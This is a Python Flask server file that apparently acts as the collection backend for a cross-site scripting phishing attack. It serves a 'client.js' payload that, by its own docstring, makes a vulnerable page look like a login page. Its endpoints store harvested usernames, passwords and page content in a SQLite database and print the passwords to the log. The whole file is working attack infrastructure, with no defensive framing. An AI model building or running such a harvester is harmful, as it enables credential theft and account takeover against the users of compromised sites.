from flask import Flask, request, send_file
from db import connect_db, insert_content, create_db, insert_credentials
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"

@app.route('/credentials', methods=["POST"])
def insert_password():
    username = request.form["username"]
    password = request.form["password"]
    try:
        print("[+] INSERT INTO credentials (username, password) VALUES ({}, {})".format(username, password))
        insert_credentials(username, password)
    except Exception as e:
        print("[-] Error inserting username:password into credentials")
        print(e)
    return("Success Inserting Password", 200)

@app.route('/content', methods=['POST'])
def insert_stuff():
    location = request.form["location"]
    content = request.form["content"]
    try:
        print("[+] INSERT INTO content (location, content) VALUES ({}, {})".format(location, "too long"))
        insert_content(location, content)
    except Exception as e:
        print("[-] Error inserting into content Table")
        return e
    return ('Success Inserting Content', 200)

@app.route('/client.js', methods=['GET'])
def clientjs():
    """
    This will send back script to make the vulernable page to look like a login page
    """
    print("[+] Sending the client payload")
    return send_file('./client.js', attachment_filename='client.js')


@app.route("/hello/", methods=["GET", "POST"])
def hello_world():
    """
    HELLO WORLD!
    """
    return "Hello World!"

app.run(host='0.0.0.0', port = 443, ssl_context = ('cert.pem', 'key.pem'))
